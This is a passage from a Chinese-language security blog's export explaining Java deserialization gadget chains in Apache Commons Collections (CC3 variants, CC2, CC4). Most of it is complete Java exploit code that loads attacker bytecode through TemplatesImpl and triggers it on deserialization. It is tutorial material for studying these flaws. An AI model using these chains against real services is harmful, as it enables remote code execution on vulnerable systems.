nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br><br>         <span class="hljs-comment">//实现instantiateTransformer.transform(TrAXFilter.class);</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]						&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>		<span class="hljs-comment">//CC1</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationdhdlerConstructor.newInstance(Target.class, lazyMap);<br><br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Override.class, mapProxy);<br><br><br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="CC6实现CC3完整版"><a href="#CC6实现CC3完整版" class="headerlink" title="CC6实现CC3完整版"></a>CC6实现CC3完整版</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<br>       <span class="hljs-comment">//实现instantiateTransformer.transform(TrAXFilter.class);</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]						&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>		<span class="hljs-comment">//CC6</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br>		<br>        <span class="hljs-comment">// 在 put 之后通过反射修改值  </span><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br><br><span class="hljs-comment">//        serialize(map2);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="">java安全漫谈-Java中动态加载字节码的那些方法</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=d195054a6a081ba07486dcc86c6ba707">类的动态加载</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC2</title>
    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC2/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC3中我们了解到<code>TemplatesImpl()</code>调用<code>Transformer()</code>方法就可以代码执行。</p>
<p>CC2就在在这个基础上，结合CC4改写。CC2最大的优势就是不用<code>Transformer</code> 数组。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>JDK8u65</li>
<li>CommonsCollections4</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>



<h2 id="CC2调用链分析"><a href="#CC2调用链分析" class="headerlink" title="CC2调用链分析"></a>CC2调用链分析</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-comment">//和CC4一样</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>		<span class="hljs-comment">//构造InvokerTransformer类去调用templates对象的newTransformer()方法</span><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-comment">//创建TransformingComparator类对象，传⼊一个临时的Transformer类对象(ConstantTransformer)，让代码序列化的时候不执行，在反序列化的时候执行。</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <br>        <br>        <span class="hljs-comment">//创建 PriorityQueue类对象传入transformingComparator对象，但是此时向队列⾥添加的元素就是我们前⾯创建的 TemplatesImpl对象了，这是因为最后调用 PriorityQueue.compare() 的时候是传入队列中的两个对象，然后 compare()中调用 Transformer.transform(obj1) 的时候用的是传入的第一个对象作为参数，因此这里需要将priorityQueue队列中的第一个对象设置为构造好的 templates 对象。</span><br>        <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602022510898.png" alt="image-20240602022510898"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
<p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">Java反序列化Commons-Collections篇05-CC2链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC4</title>
    <url>/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面几条链都是CommonsCollections3中产生的反序列化漏洞，后来Apache更新了大版本4.0，也产生了反序列化漏洞。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>JDK8u65</li>
<li>CommonsCollections4</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="CC4调用链分析"><a href="#CC4调用链分析" class="headerlink" title="CC4调用链分析"></a>CC4调用链分析</h2><p><img src="https://image.sp4rks.xyz/2024/06/CC4.png" alt="CC4"></p>
<p>在之前的CC链中，有两种执行代码的方式<code>InvokerTransformer.transform()</code>和<code>InstantiateTransformer.transform()</code>动态加载字节码</p>
<p>因为CommonsCollections4取消了InvokerTransformer 的 Serializable 继承，所以只能通过动态加载字节码的方式反序列化。</p>
<p>所以接下来去找谁调用了<code>transform()</code> 方法</p>
<p>找到了<code>org.apache.commons.collections4.comparators#TransformingComparator.compare()</code>，因为<code>this.transformer</code>可控</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601123801402.png" alt="image-20240601123801402"></p>
<p>接着找谁调用了<code>compare()</code>方法，找到了 <code>PriorityQueue.readObject().siftDownUsingComparator()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601123947569.png" alt="image-20240601123947569"></p>
<p><code>PriorityQueue.readObject()</code>中方法调用</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<p>整条调用链条，其实相当于入口类变了，新加了一个类，执行代码的部分和CC3是一样的</p>
<h2 id="CC4编写"><a href="#CC4编写" class="headerlink" title="CC4编写"></a>CC4编写</h2><p>执行代码的地方和CC3是一样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//动态加载</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br></code></pre></td></tr></table></figure>

<p>接下来就用<code>TransformingComparator</code>去调用<code>chainedTransformer</code>的<code>transformers()</code>方法</p>
<p>TransformingComparator的构造函数能直接传入transformers</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601125540711.png" alt="image-20240601125540711"></p>
<p>PriorityQueue的构造函数能直接传入comparator</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601125701669.png" alt="image-20240601125701669"></p>
<p>走到这逻辑其实就走完了，当我们运行一下，发现其实并不能正常运行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//动态加载</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br><br>        <span class="hljs-comment">//调用 ChainedTransformer.transform()</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> 